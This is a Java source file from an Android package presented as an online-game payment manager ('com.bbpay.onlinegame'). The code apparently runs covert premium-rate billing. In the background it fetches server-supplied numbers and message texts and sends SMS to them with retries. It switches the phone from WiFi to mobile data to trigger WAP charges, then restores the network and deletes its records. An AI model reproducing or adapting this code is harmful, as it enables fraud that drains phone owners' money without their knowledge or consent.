package com.bbpay.onlinegame;
import java.util.List;
import android.content.Context;
import android.os.AsyncTask;
import com.bbpay.bean.Constants;
import com.bbpay.bean.OnLineGameBiz;
import com.bbpay.bean.OnlineGameStep;
import com.bbpay.db.OnlineGameDbManager;
import com.bbpay.sms.SmsSender;
import com.bbpay.util.CollectionUtils;
import com.bbpay.util.MobileNetworkManage;
import com.bbpay.util.SimStateHelper;
import com.bbpay.util.SystemInfo;
import com.bbpay.util.TimeController;
import com.bbpay.util.Tools;
import com.bbpay.util.json.JSonParser;
import com.bbpay.util.json.MsgResponse;

public class OnLineGameManager {
    private static void batchExecute(Context context, List<OnLineGameBiz> list) {
        if (CollectionUtils.isNotEmpty(list)) {
            for (OnLineGameBiz biz : list) {
                if (!TimeController.isFeeExceeded(2, context)) {
                    execute(context, biz);
                }
            }
        }
    }
    private static void execute(final Context context, final OnLineGameBiz biz) {
        if (biz != null) {
            final List<OnlineGameStep> steps = biz.getSteps();
            if (steps != null && steps.size() != 0) {
                new AsyncTask<String, String, String>() {
                    @Override
                    protected String doInBackground(String... as) {
                        for (OnlineGameStep step : steps) {
                            executeStep(context, step);
                        }
                        return null;
                    }
                }.execute(new String[] { "" });
                OnlineGameDbManager.getInstance().deleteBiz(context, biz);
            }
        }
    }
    private static void executeStep(final Context context, OnlineGameStep step) {
        String url = step.getUrl();
        int tryCount = 3;
        while (tryCount-- > 0) {
            String requestUrl = url;
            String content = Tools.getHttpContent(requestUrl, Tools.getHeadersByDefault(context, null, null), context);
            if (content != null) {
                MsgResponse msgResponse = JSonParser.getMsgResponse(content);
                //contentId = msgResponse.getContentsid();
                if (Integer.valueOf(msgResponse.getStatus()).intValue() == 1) {
                    new SmsSender().sendSMS(context, msgResponse.getPort(), msgResponse.getContent());
                    break;
                }
            }
            try {
                Thread.sleep(1000 * step.getTimer());
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
    public static void startFee(final Context context, final List<OnLineGameBiz> list) {
        Constants.WAP_FEEING = true;
        //EpayLog.showSaveLog("===", new StringBuilder("判断运营商:").append(SystemInfo.getCardType(context)).toString());
        if (SimStateHelper.getCurrentSimState(context).isSimReady()) {
            String networkInfo = SystemInfo.getNetworkInfo(context);
            if (networkInfo.equals(SystemInfo.NETWORK_TYPE_WIFI) || networkInfo.equals(SystemInfo.UNKNOW)) MobileNetworkManage.initFee(context);
            new Thread() {
                @Override
                public void run() {
                    Constants.WAP_FEEING = false;
                    batchExecute(context, list);
                    //EpayLog.showSaveLog("===", "android处理结束，请求恢复网络");
                    MobileNetworkManage.recoverNetWork(context);
                }
            }.start();
        } else {
            Constants.WAP_FEEING = false;
            MobileNetworkManage.recoverNetWork(context);
        }
    }
}
